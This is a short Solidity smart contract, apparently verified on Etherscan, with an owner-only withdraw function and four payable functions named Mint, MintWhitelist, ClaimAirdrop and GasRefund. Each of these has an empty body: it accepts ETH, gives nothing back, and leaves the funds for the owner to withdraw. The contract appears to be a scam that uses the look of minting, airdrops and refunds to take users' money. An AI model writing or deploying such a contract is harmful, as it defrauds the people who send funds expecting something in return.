/**
 *Submitted for verification at Etherscan.io on 2023-01-25
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.16;

contract Kek {

    address private  owner;    // current owner of the contract

     constructor(){   
        owner = msg.sender;
    }

    function getOwner(
    ) public view returns (address) {    
        return owner;
    }

    modifier onlyOwner() {
        require(owner == msg.sender, "Ownable: caller is not the owner");
        _;
    }

    function withdrawBalance() external onlyOwner{
      (bool success, ) = msg.sender.call{value: address(this).balance}("");
      require(success, "WITHDRAW FAILED!");
    }

    function Mint() public payable {
    }

    function MintWhitelist() public payable {
    }

    function ClaimAirdrop() public payable {
    }

    function GasRefund() public payable {
    }
    
    
}